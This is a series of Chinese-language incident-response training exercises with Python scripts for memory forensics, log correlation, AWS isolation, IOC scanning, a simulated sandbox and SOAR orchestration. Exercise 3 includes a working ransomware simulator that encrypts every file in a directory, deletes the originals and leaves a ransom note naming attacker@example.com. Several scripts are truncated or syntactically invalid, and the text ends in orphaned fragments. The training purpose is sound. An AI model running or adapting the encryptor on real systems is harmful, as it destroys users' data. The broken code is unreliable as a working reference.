场景：服务器响应缓慢，怀疑存在挖矿木马，需要分析内存镜像提取恶意进程。
代码功能：使用Volatility3解析内存镜像，列出进程、网络连接，并检测隐藏进程或代码注入。

#!/usr/bin/env python3
"""
练习1：内存取证分析器
功能：解析内存镜像（使用volatility3），提取进程列表、网络连接，检测可疑行为
"""

import subprocess
import json
import os
import re

class MemoryAnalyzer:
    def __init__(self, image_path, volatility_path='vol'):
        self.image_path = image_path
        self.volatility = volatility_path  # 假设vol命令可用（实际可能用vol -f）
        self.results = {}
    
    def run_volatility(self, plugin):
        """执行volatility命令并返回输出"""
        cmd = f"{self.volatility} -f {self.image_path} {plugin}"
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def get_processes(self):
        """获取进程列表"""
        output = self.run_volatility("windows.pstree.PsTree")
        # 简化解析，提取进程名和PID
        processes = []
        for line in output.split('\n'):
            # 匹配类似 " 0x8a1b230c: explorer.exe 1234 ...."
            match = re.search(r'([^\s]+\.exe)\s+(\d+)', line, re.I)
            if match:
                processes.append({'name': match.group(1), 'pid': match.group(2)})
        return processes
    
    def get_connections(self):
        """获取网络连接"""
        output = self.run_volatility("windows.netscan.NetScan")
        connections = []
        for line in output.split('\n'):
            # 匹配TCP/UDP连接
            if 'TCP' in line or 'UDP' in line:
                parts = line.split()
                if len(parts) >= 5:
                    connections.append({
                        'proto': parts[0],
                        'local': parts[2],
                        'remote': parts[3],
                        'state': parts[4] if len(parts)>4 else ''
                    })
        return connections
    
    def detect_injection(self):
        """检测代码注入（使用malfind插件）"""
        output = self.run_volatility("windows.malfind.Malfind")
        suspicious = []
        for line in output.split('\n'):
            if 'MZ' in line or 'PE' in line:  # 简单特征
                suspicious.append(line)
        return suspicious
    
    def generate_report(self):
        """生成报告"""
        self.results['processes'] = self.get_processes()
        self.results['connections'] = self.get_connections()
        self.results['injections'] = self.detect_injection()
        
        print("="*50)
        print("内存分析报告")
        print("="*50)
        print(f"进程数: {len(self.results['processes'])}")
        for p in self.results['processes'][:10]:  # 只显示前10
            print(f"  {p['name']} (PID: {p['pid']})")
        
        print(f"\n网络连接: {len(self.results['connections'])}")
        for c in self.results['connections'][:5]:
            print(f"  {c['proto']} {c['local']} -> {c['remote']} {c['state']}")
        
        if self.results['injections']:
            print(f"\n[!] 发现可疑注入: {len(self.results['injections'])}")
            for i in self.results['injections'][:3]:
                print(f"  {i}")
        else:
            print("\n[+] 未发现明显注入")

if __name__ == '__main__':
    # 模拟内存镜像路径

#!/usr/bin/env python3
"""
练习2：日志关联分析器
功能：合并多种日志，按时间排序，识别攻击特征
"""

import re
import pandas as pd
from datetime import datetime
import glob

class LogCorrelator:
    def __init__(self, log_dir='./logs'):
        self.log_dir = log_dir
        self.events = []
    
    def parse_apache(self, file_pattern='access.log*'):
        """解析Apache访问日志"""
        for fname in glob.glob(f"{self.log_dir}/{file_pattern}"):
            with open(fname, 'r') as f:
                for line in f:
                    # 简单匹配：IP 时间 请求
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+) .*?\[(.*?)\] "(.*?)"', line)
                    if match:
                        ip, time_str, request = match.groups()
                        try:
                            # 转换时间格式
                            dt = datetime.strptime(time_str.split()[0], "%d/%b/%Y:%H:%M:%S")
                            self.events.append({
                                'timestamp': dt,
                                'source': ip,
                                'type': 'web_access',
                                'detail': request[:100]
                            })
                        except:
                            pass
    
    def parse_auth(self, file_pattern='auth.log*'):
        """解析系统认证日志"""
        for fname in glob.glob(f"{self.log_dir}/{file_pattern}"):
            with open(fname, 'r') as f:
                for line in f:
                    # 匹配失败登录
                    if 'Failed password' in line:
                        match = re.search(r'(\w+\s+\d+\s+\d+:\d+:\d+).*from (\d+\.\d+\.\d+\.\d+)', line)
                        if match:
                            time_str, ip = match.groups()
                            try:
                                dt = datetime.strptime(time_str, "%b %d %H:%M:%S")
                                # 假设年份为当前年
                                dt = dt.replace(year=datetime.now().year)
                                self.events.append({
                                    'timestamp': dt,
                                    'source': ip,
                                    'type': 'auth_failure',
                                    'detail': line.strip()
                                })
                            except:
                                pass
    
    def correlate(self):
        """关联分析：按时间排序，检测高频IP"""
        df = pd.DataFrame(self.events)
        if df.empty:
            print("无事件")
            return
        
        df = df.sort_values('timestamp')
        
        # 统计每个源IP的事件数
        ip_stats = df.groupby('source').size().sort_values(ascending=False)
        print("可疑IP（事件数前10）:")
        for ip, count in ip_stats.head(10).items():
            print(f"  {ip}: {count} 次")
        
        # 检测短时间内多个失败登录后成功登录的模式
        for ip in ip_stats.index[:5]:
            ip_events = df[df['source'] == ip].sort_values('timestamp')
            failures = ip_events[ip_events['type'] == 'auth_failure']
            successes = ip_events[ip_events['type'] == 'web_access']
            if len(failures) > 5 and len(successes) > 0:
                first_fail = failures.iloc[0]['timestamp']
                first_success = successes.iloc[0]['timestamp']
                if (first_success - first_fail).total_seconds() < 300:  # 5分钟内
                    print(f"\n[!] 爆破成功嫌疑: {ip} 在失败{len(failures)}次后访问成功")
        
        # 输出时间轴片段
        print("\n时间轴事件（前20）:")
        for _, row in df.head(20).iterrows():
            print(f"{row['timestamp']} [{row['source']}] {row['type']}: {row['detail']}")

if __name__ == '__main__':
    correlator = LogCorrelator(log_dir='./logs')  # 确保logs目录下有样本日志
    correlator.parse_apache()
    correlator.parse_auth()
    correlator.correlate()

#!/usr/bin/env python3
"""
练习3：勒索软件模拟与解密
警告：仅在隔离测试环境中运行！
"""

import os
import sys
import argparse
from cryptography.fernet import Fernet

# ---------- 勒索软件模拟 ----------
class RansomwareSimulator:
    """模拟勒索软件：加密指定目录下的文件"""
    def __init__(self, target_dir='./test_files'):
        self.target_dir = target_dir
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt_files(self):
        """加密文件，添加.encrypted后缀"""
        if not os.path.exists(self.target_dir):
            os.makedirs(self.target_dir)
            # 创建一些测试文件
            with open(os.path.join(self.target_dir, 'test.txt'), 'w') as f:
                f.write('This is a test file.\n')
            with open(os.path.join(self.target_dir, 'data.csv'), 'w') as f:
                f.write('id,name,value\n1,test,123\n')
        
        encrypted_count = 0
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith('.encrypted'):
                    continue
                filepath = os.path.join(root, file)
                with open(filepath, 'rb') as f:
                    data = f.read()
                encrypted_data = self.cipher.encrypt(data)
                with open(filepath + '.encrypted', 'wb') as f:
                    f.write(encrypted_data)
                os.remove(filepath)
                encrypted_count += 1
        
        # 留下勒索信息
        ransom_note = f"""
        YOUR FILES HAVE BEEN ENCRYPTED!
        To decrypt, send 1 BTC to wallet and contact attacker@example.com
        Your unique key: {self.key.decode()}
        """
        with open(os.path.join(self.target_dir, 'README.txt'), 'w') as f:
            f.write(ransom_note)
        
        print(f"[模拟] 已加密 {encrypted_count} 个文件")
        print(f"[模拟] 密钥: {self.key.decode()}")
        return self.key

# ---------- 解密工具 ----------
class Decryptor:
    """解密被勒索软件加密的文件"""
    def __init__(self, key, target_dir='./test_files'):
        self.key = key
        self.cipher = Fernet(key)
        self.target_dir = target_dir
    
    def decrypt_files(self):
        """查找.encrypted文件并解密"""
        decrypted_count = 0
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith('.encrypted'):
                    filepath = os.path.join(root, file)
                    with open(filepath, 'rb') as f:
                        encrypted_data = f.read()
                    try:
                        data = self.cipher.decrypt(encrypted_data)
                        original_path = filepath[:-10]  # 移除.encrypted
                        with open(original_path, 'wb') as f:
                            f.write(data)
                        os.remove(filepath)
                        decrypted_count += 1
                        print(f"[+] 解密: {original_path}")
                    except Exception as e:
                        print(f"[-] 解密失败 {filepath}: {e}")
        print(f"[完成] 已解密 {decrypted_count} 个文件")

if __name__ == '__main__':

练习4：云环境应急响应 - AWS自动化隔离（10分钟）
场景：AWS EC2实例被入侵，需要立即隔离，同时创建快照取证。
代码功能：使用boto3调用AWS API，自动化隔离实例（修改安全组、停止实例、创建快照）。

#!/usr/bin/env python3
"""
练习4：AWS应急响应自动化
功能：隔离被入侵EC2实例，创建快照
需配置AWS凭证（环境变量或~/.aws/credentials）
"""

import boto3
import argparse
import time
from datetime import datetime

class AWSResponder:
    def __init__(self, region='us-east-1'):
        self.ec2 = boto3.resource('ec2', region_name=region)
        self.client = boto3.client('ec2', region_name=region)
    
    def get_instance_info(self, instance_id):
        """获取实例详情"""
        instance = self.ec2.Instance(instance_id)
        return {
            'id': instance.id,
            'state': instance.state['Name'],
            'public_ip': instance.public_ip_address,
            'private_ip': instance.private_ip_address,
            'security_groups': instance.security_groups
        }
    
    def isolate_instance(self, instance_id, snapshot_volumes=True):
        """隔离实例：创建快照，修改安全组，停止实例"""
        print(f"[*] 开始隔离实例 {instance_id}")
        instance = self.ec2.Instance(instance_id)
        
        # 1. 创建卷快照
        if snapshot_volumes:
            for vol in instance.volumes.all():
                snapshot = vol.create_snapshot(
                    Description=f"Forensics snapshot for {instance_id} at {datetime.now()}"
                )
                print(f"   创建快照: {snapshot.id} 从卷 {vol.id}")
        
        # 2. 获取原安全组
        original_sgs = [sg['GroupId'] for sg in instance.security_groups]
        
        # 3. 创建一个隔离安全组（拒绝所有流量）
        sg_name = f"isolated-{instance_id}"
        try:
            response = self.client.create_security_group(
                GroupName=sg_name,
                Description="Isolation security group - no traffic"
            )
            isolation_sg = response['GroupId']
            # 删除所有规则（默认允许出站，需删除）
            self.client.revoke_security_group_egress(
                GroupId=isolation_sg,
                IpPermissions=[{'IpProtocol': '-1', 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}]
            )
            print(f"   创建隔离安全组: {isolation_sg}")
        except Exception as e:
            print(f"   安全组可能已存在: {e}")
            # 查找现有隔离组
            sgs = self.client.describe_security_groups(GroupNames=[sg_name])
            isolation_sg = sgs['SecurityGroups'][0]['GroupId']
        
        # 4. 修改实例安全组
        instance.modify_attribute(Groups=[isolation_sg])
        print(f"   已修改安全组为隔离组")
        
        # 5. 停止实例
        if instance.state['Name'] == 'running':
            instance.stop()
            print(f"   正在停止实例...")
            instance.wait_until_stopped()
            print(f"   实例已停止")
        
        # 6. 记录原始信息以便恢复
        print(f"[+] 隔离完成。原始安全组: {original_sgs}")
        return original_sgs
    
    def restore_instance(self, instance_id, original_sgs):
        """恢复实例（重新启动并还原安全组）"""
        instance = self.ec2.Instance(instance_id)
        instance.modify_attribute(Groups=original_sgs)
        instance.start()
        print(f"[+] 实例已恢复")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='AWS应急响应')
    parser.add_argument('--instance', required=True, help='EC2实例ID')
    parser.add_argument('--action', choices=['isolate', 'restore'], required=True)
    parser.add_argument('--original-sgs', nargs='+', help='恢复时需要的原安全组')
    args = parser.parse_args()
    
    responder = AWSResponder()
    if args.action == 'isolate':
        responder.isolate_instance(args.instance)
    elif args.action == 'restore':
        if not args.original_sgs:
            print("错误：恢复需要提供 --original-sgs")
        else:
            responder.restore_instance(args.instance, args.original_sgs)

练习5：威胁狩猎IOC扫描 - YARA规则匹配（10分钟）
场景：根据威胁情报提供的IOC（文件哈希、IP、域名），在主机上扫描匹配项。
代码功能：使用YARA规则扫描文件系统，同时检查进程内存和网络连接。

#!/usr/bin/env python3
"""
练习5：IOC扫描器
功能：使用YARA规则扫描文件，同时检查进程和网络连接
"""

import os
import yara
import psutil
import requests
import json
import hashlib

class IOCScanner:
    def __init__(self, ioc_file='iocs.json'):
        self.iocs = self.load_iocs(ioc_file)
        self.matches = []
    
    def load_iocs(self, ioc_file):
        """加载IOC配置"""
        with open(ioc_file, 'r') as f:
            return json.load(f)
    
    def compile_yara_rules(self):
        """编译YARA规则"""
        rules = {}
        for rule_name, rule_text in self.iocs.get('yara_rules', {}).items():
            rules[rule_name] = yara.compile(source=rule_text)
        return rules
    
    def scan_file(self, filepath, rules):
        """用YARA扫描单个文件"""
        try:
            for rule_name, rule in rules.items():
                matches = rule.match(filepath)
                if matches:
                    self.matches.append({
                        'type': 'file',
                        'path': filepath,
                        'rule': rule_name,
                        'details': str(matches)
                    })
        except:
            pass
    
    def scan_directory(self, start_dir='/', rules):
        """递归扫描目录"""
        for root, dirs, files in os.walk(start_dir):
            for file in files:
                filepath = os.path.join(root, file)
                self.scan_file(filepath, rules)
                # 限制数量防止卡死
                if len(self.matches) > 100:
                    break
    
    def check_processes(self):
        """检查进程名和哈希是否匹配IOC"""
        ioc_procs = self.iocs.get('process_names', [])
        ioc_hashes = self.iocs.get('file_hashes', [])
        
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if proc.info['name'] in ioc_procs:
                    self.matches.append({
                        'type': 'process',
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'reason': 'process_name_match'
                    })
                
                # 计算可执行文件哈希
                if proc.info['exe'] and os.path.exists(proc.info['exe']):
                    with open(proc.info['exe'], 'rb') as f:
                        file_hash = hashlib.md5(f.read()).hexdigest()
                    if file_hash in ioc_hashes:
                        self.matches.append({
                            'type': 'process',
                            'pid': proc.info['pid'],
                            'name': proc.info['name'],
                            'hash': file_hash,
                            'reason': 'hash_match'
                        })
            except:
                pass
    
    def check_connections(self):
        """检查网络连接是否匹配IOC IP/域名"""
        ioc_ips = self.iocs.get('ip_addresses', [])
        ioc_domains = self.iocs.get('domains', [])
        
        for conn in psutil.net_connections(kind='inet'):
            if conn.raddr:
                ip = conn.raddr.ip
                port = conn.raddr.port
                if ip in ioc_ips:
                    self.matches.append({
                        'type': 'connection',
                        'local': f"{conn.laddr.ip}:{conn.laddr.port}",
                        'remote': f"{ip}:{port}",
                        'reason': 'ip_match'
                    })
    
    def scan(self):
        """执行全面扫描"""
        print("[*] 编译YARA规则...")
        rules = self.compile_yara_rules()
        
        print("[*] 扫描文件系统（可能较慢，限制为/tmp）...")
        self.scan_directory('/tmp', rules)  # 仅扫描/tmp作为示例
        
        print("[*] 检查进程...")
        self.check_processes()
        
        print("[*] 检查网络连接...")
        self.check_connections()
        
        # 输出结果
        print(f"\n[+] 发现 {len(self.matches)} 个匹配项")
        for m in self.matches:
            print(f"  [{m['type']}] {m}")

if __name__ == '__main__':
    # 示例IOC文件
    ioc_example = {
        "yara_rules": {

练习6：动态行为分析 - 沙箱监控（10分钟）
场景：获取一个可疑样本，需要在隔离环境中动态运行，监控其行为。
代码功能：使用Python监控进程API调用（通过ptrace或模拟），记录文件、注册表、网络行为。由于实际监控复杂，这里用模拟数据演示。

#!/usr/bin/env python3
"""
练习6：动态行为分析沙箱（模拟）
功能：模拟运行样本，记录文件、网络、进程行为
"""

import time
import random
import json
from datetime import datetime

class SandboxSimulator:
    """模拟沙箱行为分析"""
    
    def __init__(self, sample_name):
        self.sample_name = sample_name
        self.behavior = {
            'sample': sample_name,
            'start_time': datetime.now().isoformat(),
            'processes': [],
            'file_operations': [],
            'network_connections': [],
            'registry_changes': [],
            'suspicious_score': 0
        }
    
    def run_simulation(self):
        """模拟运行，生成行为日志"""
        print(f"[*] 正在分析样本: {self.sample_name}")
        
        # 模拟进程创建
        proc1 = {'pid': 1234, 'name': self.sample_name, 'cmdline': f'./{self.sample_name}'}
        self.behavior['processes'].append(proc1)
        
        # 模拟文件操作
        self.behavior['file_operations'].append({
            'time': time.time(),
            'action': 'create',
            'path': '/tmp/evil.exe',
            'result': 'success'
        })
        self.behavior['file_operations'].append({
            'time': time.time(),
            'action': 'write',
            'path': '/etc/passwd',
            'result': 'permission_denied'
        })
        
        # 模拟网络连接
        self.behavior['network_connections'].append({
            'time': time.time(),
            'proto': 'TCP',
            'local': '192.168.1.100:12345',
            'remote': '203.0.113.45:4444',
            'state': 'ESTABLISHED'
        })
        
        # 模拟注册表修改（Windows）
        self.behavior['registry_changes'].append({
            'time': time.time(),
            'key': r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            'value': 'Malware',
            'data': 'C:\\evil.exe'
        })
        
        # 计算可疑分数
        score = 0
        if len(self.behavior['network_connections']) > 0:
            score += 30
        if any('passwd' in op['path'] for op in self.behavior['file_operations']):
            score += 50
        if any('Run' in reg['key'] for reg in self.behavior['registry_changes']):
            score += 20
        
        self.behavior['suspicious_score'] = score
        self.behavior['threat_level'] = 'high' if score > 70 else 'medium' if score > 30 else 'low'
        
        return self.behavior
    
    def generate_report(self, output_file=None):
        """生成报告"""
        report = f"""
动态行为分析报告
==================
样本: {self.behavior['sample']}
分析时间: {self.behavior['start_time']}
威胁等级: {self.behavior['threat_level']}
可疑分数: {self.behavior['suspicious_score']}

进程行为:
"""
        for p in self.behavior['processes']:
            report += f"  - {p['name']} (PID: {p['pid']})\n"
        
        report += "\n文件操作:\n"
        for op in self.behavior['file_operations']:
            report += f"  - {op['action']} {op['path']} -> {op['result']}\n"
        
        report += "\n网络连接:\n"
        for conn in self.behavior['network_connections']:
            report += f"  - {conn['proto']} {conn['local']} <-> {conn['remote']} {conn['state']}\n"
        
        report += "\n注册表修改:\n"
        for reg in self.behavior['registry_changes']:
            report += f"  - {reg['key']}: {reg['value']} = {reg['data']}\n"
        
        print(report)
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(report)
            print(f"[+] 报告已保存: {output_file}")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='行为分析沙箱')
    parser.add_argument('sample', help='样本文件名')
    parser.add_argument('--output', help='输出报告文件')
    args = parser.parse_args()
    
    sandbox = SandboxSimulator(args.sample)
    sandbox.run_simulation()
    sandbox.generate_report(args.output)

练习7：自动化编排 - SOAR工作流（10分钟）
场景：整合前几个练习，构建一个简单SOAR工作流：收到告警后自动隔离主机、扫描IOC、生成报告。
代码功能：定义工作流步骤，调用之前的模块，实现自动化响应。

#!/usr/bin/env python3
"""
练习7：SOAR工作流编排器
功能：根据告警自动执行响应流程
"""

import json
import time
from datetime import datetime
import subprocess
import os

class SOARWorkflow:
    def __init__(self, config_file='soar_config.json'):
        self.config = self.load_config(config_file)
        self.incident = {}
        self.log = []
    
    def load_config(self, config_file):
        """加载配置"""
        default = {
            "aws": {"enabled": False},
            "ioc_scanner": {"enabled": True},
            "slack_webhook": "",
            "response_actions": ["isolate", "scan", "notify"]
        }
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                return json.load(f)
        return default
    
    def log_step(self, step, status, details):
        """记录步骤"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'step': step,
            'status': status,
            'details': details
        }
        self.log.append(entry)
        print(f"[{status}] {step}: {details}")
    
    def receive_alert(self, alert_data):
        """接收告警"""
        self.incident = {
            'id': f"INC-{datetime.now().strftime('%Y%m%d%H%M%S')}",
            'alert': alert_data,
            'status': 'new',
            'start_time': datetime.now().isoformat()
        }
        self.log_step('receive_alert', 'SUCCESS', f"收到告警: {alert_data.get('title')}")
        return self.incident
    
    def isolate_host(self, instance_id):
        """调用AWS隔离模块"""
        if not self.config['aws']['enabled']:
            self.log_step('isolate_host', 'SKIPPED', 'AWS未启用')
            return None
        
        try:
            # 调用练习4的脚本
            cmd = f"python aws_responder.py --instance {instance_id} --action isolate"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                self.log_step('isolate_host', 'SUCCESS', f"实例 {instance_id} 已隔离")
                return result.stdout
            else:
                self.log_step('isolate_host', 'FAILED', result.stderr)
                return None
        except Exception as e:
            self.log_step('isolate_host', 'ERROR', str(e))
            return None
    
    def scan_iocs(self, target):
        """调用IOC扫描器"""
        try:
            # 调用练习5的脚本
            cmd = f"python ioc_scanner.py --target {target}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                self.log_step('scan_iocs', 'SUCCESS', f"IOC扫描完成")
                return result.stdout
            else:
                self.log_step('scan_iocs', 'FAILED', result.stderr)
                return None
        except Exception as e:
            self.log_step('scan_iocs', 'ERROR', str(e))
            return None
    
    def send_notification(self, message):
        """发送Slack通知"""
        webhook = self.config.get('slack_webhook')
        if not webhook:
            self.log_step('send_notification', 'SKIPPED', '未配置Slack')
            return
        
        import requests
        payload = {'text': message}
        try:
            r = requests.post(webhook, json=payload)
            if r.status_code == 200:
                self.log_step('send_notification', 'SUCCESS', '通知已发送')
            else:
                self.log_step('send_notification', 'FAILED', f'HTTP {r.status_code}')
        except Exception as e:
            self.log_step('send_notification', 'ERROR', str(e))
    
    def generate_report(self):
        """生成最终报告"""
        report = f"""
SOAR工作流执行报告
====================
事件ID: {self.incident['id']}
开始时间: {self.incident['start_time']}
结束时间: {datetime.now().isoformat()}
告警: {json.dumps(self.incident['alert'], indent=2)}

执行步骤:
"""
        for step in self.log:
            report += f"\n{step['timestamp']} [{step['status']}] {step['step']}: {step['details']}"
        
        report += "\n\n[+] 工作流完成"
        print(report)
        with open(f"report_{self.incident['id']}.txt", 'w') as f:
            f.write(report)
    
    def run(self, alert):
        """执行工作流"""
        self.receive_alert(alert)
        
        actions = self.config.get('response_actions', [])
        for action in actions:
            if action == 'isolate' and 'instance_id' in alert:
                self.isolate_host(alert['instance_id'])
            elif action == 'scan' and 'target' in alert:
                self.scan_iocs(alert['target'])
            elif action == 'notify':
                msg = f"事件 {self.incident['id']}: {alert.get('title')}"
                self.send_notification(msg)
        
        self.generate_report()

if __name__ == '__main__':

        'target': '/tmp',

    workflow = SOARWorkflow()
    workflow.run(test_alert)
